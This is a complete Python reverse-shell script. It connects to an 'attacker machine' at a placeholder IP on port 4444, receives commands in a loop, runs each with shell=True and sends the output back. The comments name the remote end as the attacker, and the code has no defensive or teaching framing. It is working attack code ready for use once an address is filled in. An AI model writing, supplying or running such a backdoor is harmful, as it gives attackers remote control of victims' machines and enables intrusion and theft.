import socket
import subprocess

def execute_command(command):
    try:
        # Execute the command and capture the output
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except Exception as e:
        return str(e)

def main():
    # Define your attacker machine's IP address and the port to listen on
    attacker_ip = '!INPUT IP HERE!'
    port = 4444

    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the attacker machine
        client_socket.connect((attacker_ip, port))
        print("[*] Connected to attacker machine")
        
        while True:
            # Receive command from the attacker machine
            command = client_socket.recv(1024).decode()
            
            # Execute the command and send the output back to the attacker machine
            output = execute_command(command)
            client_socket.send(output.encode())
    
    except Exception as e:
        print(f"[*] Error: {str(e)}")

    finally:
        # Close the socket connection
        client_socket.close()

if __name__ == "__main__":
    main()
